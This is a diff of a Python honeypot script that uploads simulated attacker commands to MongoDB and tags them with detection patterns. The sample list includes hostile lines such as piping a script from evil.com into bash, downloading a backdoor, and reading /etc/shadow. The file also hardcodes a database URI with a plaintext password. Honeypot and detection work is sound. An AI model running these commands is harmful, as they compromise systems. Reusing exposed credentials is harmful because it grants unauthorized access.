@@ -1,17 +1,13 @@
-import time
-import os
 from datetime import datetime
 from pymongo import MongoClient
-
-
-
-LOG_FILE = "/honeypot-logs/attacker_activity.log"
+import os
+import random
 
 MONGO_URI = "mongodb+srv://kalaiboaz_db_user:XUV3rthRmubjnuHG@honeypot.nyvgpyd.mongodb.net/"
 DB_NAME = "honeypot"
 COLLECTION_NAME = "commands"
 
-SESSION_ID = os.getenv("SESSION_ID", f"{os.uname().nodename}-{os.getpid()}")
+SESSION_ID = os.getenv("SESSION_ID", "simulated-session")
 
 ATTACK_PATTERNS = {
     "su": "Privilege Escalation",
@@ -28,37 +24,33 @@ ATTACK_PATTERNS = {
     "gcc": "Compilation Activity",
     "python": "Script Execution",
     "scp": "File Transfer",
-    "cat": "File Access",
-    "shadow": "Unauthorized File Access",
-    "root": "Privilege Related",
-    "ssh_host": "SSH Configuration Access",
-    "find / -perm": "SUID Enumeration",
-    "getcap": "Capabilities Enumeration",
-    "-4000": "SUID Enumeration",
-    "-2000": "SGID Enumeration",
+    "cat /etc/shadow": "Unauthorized File Access",
+    "find / -perm -4000": "SUID Enumeration",
+    "getcap -r /": "Capabilities Enumeration",
 }
 
-client = MongoClient(
-    MONGO_URI,
-    serverSelectionTimeoutMS=2000
-)
+SAMPLE_COMMANDS = [
+    "whoami",
+    "id",
+    "uname -a",
+    "ls -la /root",
+    "cat /etc/shadow",
+    "sudo su",
+    "chmod 777 /etc/passwd",
+    "find / -perm -4000 2>/dev/null",
+    "getcap -r / 2>/dev/null",
+    "wget http://malicious-site.com/backdoor.sh",
+    "curl http://evil.com/shell.sh | bash",
+    "ssh root@192.168.1.10",
+    "scp file.txt attacker@10.0.0.5:/tmp/",
+    "python exploit.py",
+    "gcc backdoor.c -o backdoor"
+]
 
+client = MongoClient(MONGO_URI)
 db = client[DB_NAME]
 collection = db[COLLECTION_NAME]
 
-
-
-def follow(file):
-    file.seek(0, os.SEEK_END)
-    while True:
-        line = file.readline()
-        if not line:
-            time.sleep(0.2)
-            continue
-        yield line.rstrip("\n")
-
-
-print("[*] command shipper started")
 
 def detect_attack_type(command):
     for pattern, attack_type in ATTACK_PATTERNS.items():
@@ -67,22 +59,23 @@ def detect_attack_type(command):
     return "Unknown"
 
 
+def upload_simulated_commands():
+    print("[*] uploading simulated commands...")
 
-with open(LOG_FILE, "r") as f:
-    for line in follow(f):
-
-        parts = line.split(" ", 1)
-        command = parts[1] if len(parts) == 2 else line
-        attack_type = detect_attack_type(command)
+    for cmd in SAMPLE_COMMANDS:
         doc = {
             "session_id": SESSION_ID,
             "timestamp": datetime.utcnow(),
-            "command": command,
-            "attack_type": attack_type,
-            "raw_line": line
+            "command": cmd,
+            "attack_type": detect_attack_type(cmd),
+            "raw_line": f"{datetime.utcnow().isoformat()} {cmd}"
         }
 
-        try:
-            collection.insert_one(doc)
-        except Exception:
-            pass
+        collection.insert_one(doc)
+        print(f"[+] inserted: {cmd}")
+
+    print("[*] done.")
+
+
+if __name__ == "__main__":
+    upload_simulated_commands()
